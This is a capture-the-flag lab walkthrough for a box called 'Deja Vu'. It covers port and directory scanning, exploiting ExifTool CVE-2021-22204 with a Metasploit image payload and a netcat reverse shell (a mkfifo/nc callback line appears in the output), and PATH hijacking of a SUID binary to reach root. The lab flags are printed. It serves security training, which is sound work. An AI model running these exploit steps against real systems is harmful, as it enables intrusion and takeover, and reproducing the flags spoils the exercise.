@@ -1,0 +1,327 @@
+DEJA VU.
+
+
+
+
+[>>> TASK 1: DEJA VU]
+[1.1. DEPLOY THE VIRTUAL MACHINE, WAIT 3-5 MINUTES FOR IT TO BOOT.]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 2: DOG PICTURES - EXPLORING A WEBAPP]
+[2.1. CLICK AROUND THE WEBSITE. CAN YOU FIND ANY DEVELOPER COMMENTS?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.108.60
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+
+
+[ACTION: explore http://10.10.108.60/]
+We land on a site that looks like a gallery of dog pictures.
+There are no clear redirection buttons, so i move on to inspect source.
+
+
+[ACTION: inspect source (ctrl + u)]
+[OUTPUT (snippet)]
+   <!--
+        What should happen when we click on a picture of a dog? 
+        How do we style it to make it show that it's clickable?
+    -->
+[NOTE]
+Looks like the images are clickable.
+Showing additional info besides each picture.
+
+
+
+[2.2. CAN YOU FIND THE PAGE THAT GIVES MORE DETAILS ABOUT A DOG PHOTO?]
+All pages show extra info on the pets.
+
+
+
+[2.3. PERFORM AN NMAP SCAN OF THE TARGET. WHAT VERSON OF SSH IS IN USE?]
+[ANSWER (based on 2.1 output)]
+openssh 8.0 (protocol 2.0)
+
+
+
+
+[>>> TASK 3: VULNERABILITY DISCOVERY]
+[3.1. WHAT PAGE CAN BE USED TO UPLOAD YOUR OWN DOG PICTURE?]
+[ACTION: gobuster can with big.txt wordlist]
+gobuster dir -u http://10.10.108.60 -w /usr/share/dirb/wordlists/big.txt
+[OUTPUT]
+/favicon.ico          (Status: 200) [Size: 21665]
+/upload               (Status: 301) [Size: 0] [--> upload/]
+[ANSWER]
+/upload/
+
+
+
+[3.2. WHAT API ROUTE IS USED TO PROVIDE THE TITLE AND CAPTION FOR A SPECIFIC DOG IMAGE?]
+[ACTION: view sitemap]
+1. Open burpsuite.
+2. Click open browser.
+3. Visit http://10.10.108.60
+At first glance, we find no api under dog directory.
+I realized I needed to visit the specific dog for the apis to trigger.
+It is the bunny, due to the weird caption.
+3. Visit http://10.10.108.60/dogpic/?id=6
+4. View Target > Site map
+[OUTPUT (snippet under dog)]
+getexifdata
+getmetadata
+[NOTE]
+In this question, we are asked about title and caption, so answer must be metadata (exif data is specifics).
+[ANSWER]
+/dog/getmetadata
+
+
+
+[3.3. WHAT API ROUTE DOES THE APPLICATION USE TO RETRIEVE FURTHER INFORMATION ABOUT THE DOG PICTURE?]
+[ANSWER]
+/dog/getexifdata
+
+
+
+[3.4. WHAT ATTRIBUTE IN THE JSON RESPONSE FROM THIS ENDPOINT SPECIFIES THE VERSION OF EXIFTOOL BEING USED IN THE WEBAPP?]
+[OUTPUT: request get /dog/exifdata/6]
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sun, 27 Jul 2025 11:18:06 GMT
+Content-Length: 900
+
+[{
+  "SourceFile": "temp/1603479299.jpg",
+  "ExifToolVersion": 12.23,
+  "FileName": "1603479299.jpg",
+  "Directory": "temp",
+  "FileSize": "21 KiB",
+  "FileModifyDate": "2025:07:27 12:18:06+01:00",
+  "FileAccessDate": "2025:07:27 12:18:06+01:00",
+  "FileInodeChangeDate": "2025:07:27 12:18:06+01:00",
+  "FilePermissions": "-rw-------",
+  "FileType": "JPEG",
+  "FileTypeExtension": "jpg",
+  "MIMEType": "image/jpeg",
+  "ExifByteOrder": "Big-endian (Motorola, MM)",
+  "Artist": "MamaMouse",
+  "XPAuthor": "MamaMouse",
+  "Padding": "(Binary data 2060 bytes, use -b option to extract)",
+  "About": "uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b",
+  "Creator": "MamaMouse",
+  "ImageWidth": 400,
+  "ImageHeight": 400,
+  "EncodingProcess": "Baseline DCT, Huffman coding",
+  "BitsPerSample": 8,
+  "ColorComponents": 3,
+  "YCbCrSubSampling": "YCbCr4:2:0 (2 2)",
+  "ImageSize": "400x400",
+  "Megapixels": 0.160
+}]
+[NOTE]
+Output snippet:"ExifToolVersion": 12.23
+[ANSWER]
+ExifToolVersion
+
+
+
+[3.5. WHAT VERSION OF EXIFTOOL IS IN USE?]
+[ANSWER (based on last output)]
+12.23
+
+
+
+[3.6. WHAT RCE EXPLOIT IS PRESENT IN THIS VERSION OF EXIFTOOL? GIVE THE CVE NUMBER IN FORMAT CVE-XXXX-XXXXX]
+[ACTION: research rce exploits for exiftool 12.23]
+[OUTPUT]
+ExifTool 12.23 - Arbitrary Code Execution (https://www.exploit-db.com/exploits/50911)
+[ANSWER]
+CVE-2021-22204
+
+
+
+
+[TASK 4: EXPLOITATION]
+[4.1. GENERATE AN IMAGE PAYLOAD WITH METASPLOIT]
+[ACTION: exploit with metasploit]
+msfconsole
+use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
+set LHOST 10.23.25.109
+run
+[OUTPUT]
+[+] msf.jpg stored at /home/user0/.msf4/local/msf.jpg
+
+
+
+[4.2. GET CODE EXECUTION ON THE TARGET MACHINE]
+[ACTION: start listener on same port as payload]
+nc -lnvp 4444
+
+
+[NOTE]
+Any title and caption can be used.
+[ACTION: upload msf.jpg to machine via http://10.10.108.60/upload/]
+
+
+
+[ACTION: spawn rev shell/trigger exploit]
+visit new image: http://10.10.108.60/dogpic/?id=7.
+[NOTE]
+I caught no rev shell.
+
+
+[NOTE]
+I forgot to set payload option DisablePayloadHandler to false.
+As it is true, we can never catch a shell.
+[ACTION: retry exploit]
+set DisablePayloadHandler false
+run
+nc -lnvp 4444
+Upload jpeg
+
+
+[NOTE]
+Again, I caught no shell.
+I was using the wrong payload.
+Wrong: cmd/unix/php/meterpreter/reverse_tcp (we aren't even exploiting php...)
+Right: cmd/unix/reverse_netcat
+[ACTION: third exploit attempt]
+set payload cmd/unix/reverse_netcat 
+run
+nc -lnvp 4444
+Upload jpeg
+[OUTPUT]
+connect to [10.23.25.109] from (UNKNOWN) [10.10.108.60] 40328
+
+[NOTE]
+We ran: /usr/bin/script -qc /bin/bash /dev/null
+Since the usual 2 options failed.
+Option 1: python3 -c 'import pty; pty.spawn("/bin/bash")'
+Option 2: python -c 'import pty; pty.spawn("/bin/bash")'
+[ACTION: stabilize shell]
+/usr/bin/script -qc /bin/bash /dev/null
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+
+
+
+[4.3. RETRIEVE THE FLAG LOCATED IN /home/dogpics/user.txt. WHAT IS THE USER FLAG?]
+cat /home/dogpics/user.txt
+[OUTPUT]
+dejavu{735c0553063625f41879e57d5b4f3352}
+
+
+
+
+[>>> TASK 5: PRIVILEGE ESCALATION - ENUMERATION AND PATH EXPLORATION]
+[5.1. STABILIZE YOUR REVERSE SHELL TO ENSURE THAT YOU CAN RUN INTERACTIVE BINARIES]
+We already did it.
+
+
+[5.2. FIND THE SUID BINARY]
+[ACTION: check suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/home/dogpics/serverManager
+
+
+[NOTE]
+The privesc exploit explanation talks abut a binary on the /home folder, so we will limit our scan to that directory.
+[ACTION: check suid binaries in /home]
+find /home -perm -4000 -type f 2>/dev/null 
+[OUTPUT]
+/home/dogpics/serverManager
+
+
+
+[5.3. VERIFY (BASED ON OUTPUT) THAT THE serverManager PROGRAM RUNS SYSTEMCTL WHEN YOU RUN IT. TRY RUNNING THE SAME COMMAND AS THE BINARY YOURSELF - systemctl status dogpics --no-pager]
+[ACTION: run same command as binary]
+systemctl status dogpics --no-pager
+[OUTPUT]
+● dogpics.service - Dog pictures
+   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
+   Active: active (running) since Sun 2025-07-27 11:49:00 BST; 1h 6min ago
+ Main PID: 800 (webserver)
+    Tasks: 14 (limit: 5835)
+   Memory: 137.9M
+   CGroup: /system.slice/dogpics.service
+           ├─ 800 /home/dogpics/webserver -p 80
+           ├─1301 /usr/bin/perl -w ./exiftool/exiftool -j temp/1008172097.jpg
+           ├─1302 sh -c mkfifo /tmp/ygxukn; nc 10.23.25.109 4444 0</tmp/ygxukn …
+           ├─1304 nc 10.23.25.109 4444
+           ├─1305 /bin/sh
+           ├─1309 /usr/bin/script -qc /bin/bash /dev/null
+           ├─1311 /bin/bash
+           └─1365 systemctl status dogpics --no-pager
+
+
+[ACTION: run the binary]
+./serverManager
+0
+[OUTPUT]
+● dogpics.service - Dog pictures
+   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
+   Active: active (running) since Sun 2025-07-27 11:49:00 BST; 1h 8min ago
+ Main PID: 800 (webserver)
+    Tasks: 15 (limit: 5835)
+   Memory: 138.1M
+   CGroup: /system.slice/dogpics.service
+           ├─ 800 /home/dogpics/webserver -p 80
+           ├─1301 /usr/bin/perl -w ./exiftool/exiftool -j temp/1008172097.jpg
+           ├─1302 sh -c mkfifo /tmp/ygxukn; nc 10.23.25.109 4444 0</tmp/ygxukn …
+           ├─1304 nc 10.23.25.109 4444
+           ├─1305 /bin/sh
+           ├─1309 /usr/bin/script -qc /bin/bash /dev/null
+           ├─1311 /bin/bash
+           ├─1370 ./serverManager
+           └─1371 systemctl status --no-pager dogpics
+[NOTE]
+Both commands run the same.
+
+
+
+[5.4. CREATE YOUR FAKE systemctl, ENSURE IT'S CORRECTLY ADDED TO PATH, AND ESCALATE YOUR PRIVILEGES]
+[ACTION: create fake systemctl]
+1. Add line to spawn root shell: echo '/bin/bash' > systemctl
+2. Make fake systemctl executable: chmod +x systemctl
+
+
+[ACTION: update and verify new path]
+1. Add current directory to beginning of path, which means it will be searched before rest of path: export PATH=.:$PATH
+2. Check if path update succesful: which systemctl
+[OUPTPUT]
+./systemctl
+
+
+[ACTION: run exploit]
+./serverManager
+0
+[OUTPUT]
+[root@dejavu ~]# 
+
+
+
+[5.5. RETRIEVE THE ROOT FLAG FROM /root/root.txt. WHAT IS THE ROOT FLAG?]
+cat /root/root.txt
+[OUTPUT]
+dejavu{5ad931368bdc46f856febe4834ace627}
